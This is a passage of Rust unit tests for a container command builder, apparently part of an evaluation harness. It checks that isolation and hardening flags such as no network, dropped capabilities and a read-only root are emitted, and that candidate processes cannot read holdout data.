            &r,
            &fx.base,
            "harness container probe failed.*candidate process can read the holdout",
        )
        .await;
    }
}

mod container_command_line_unit {
    use super::*;

    fn spec() -> ContainerRunSpec {
        ContainerRunSpec {
            rt: ContainerRuntime::new(format!("ratchet-env:img-{}", "0".repeat(40))),
            name: "\"$CN\"".into(),
            user: "\"$BUID:$BGID\"".into(),
            cap_add: vec![],
            no_new_privileges: true,
            network: ContainerNetwork::None,
            workdir: "\"$CODE\"".into(),
            mounts: vec!["$CODE:$CODE".into()],
            pass_env: vec![],
            env: vec![],
            extra: vec![],
            command: "'true'".into(),
        }
    }

    #[test]
    fn spells_out_every_hardening_flag_once_in_one_place() {
        let c = container_run(&spec());
        for f in [
            "--rm",
            "--pull never",
            "--init",
            "--network none",
            "--cap-drop ALL",
            "--security-opt no-new-privileges",
            "--read-only",
            "--pids-limit 4096",
            "--entrypoint sh",
            "-v \"$CODE:$CODE\"",
        ] {
            assert!(c.contains(f), "{f}");
        }
        assert!(!c.contains("--privileged"));
        let mut s = spec();
        s.rt.options.read_only_root = Some(false);
        assert!(!container_run(&s).contains("--read-only"));
    }

    #[test]
    fn container_run_trusts_its_callers_the_script_builders_validate() {
        let mut s = spec();
        s.rt.tag = "x".into();
        assert!(container_run(&s).contains("'x'"));
        let _ = (CANDIDATE_HELPER, BenchLaunchPurpose::Deps);
    }
}
